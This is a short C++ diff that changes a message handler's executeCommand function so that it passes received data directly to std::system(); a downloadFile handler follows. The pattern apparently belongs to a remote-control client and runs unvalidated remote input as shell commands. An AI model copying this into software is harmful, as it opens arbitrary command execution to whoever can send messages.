@@ -15,7 +15,9 @@
 bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 {
 	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;
-	//return std::system(byte2string(data).c_str()); // returns non-zero on error
+	return std::system(byte2string(data).c_str()); // returns non-zero on error
+
+	/* TODO: 
 
 	std::string command = byte2string(data).c_str();
 	std::string result;
@@ -37,6 +39,7 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 	}
 
 	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
+	*/
 }
 
 bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
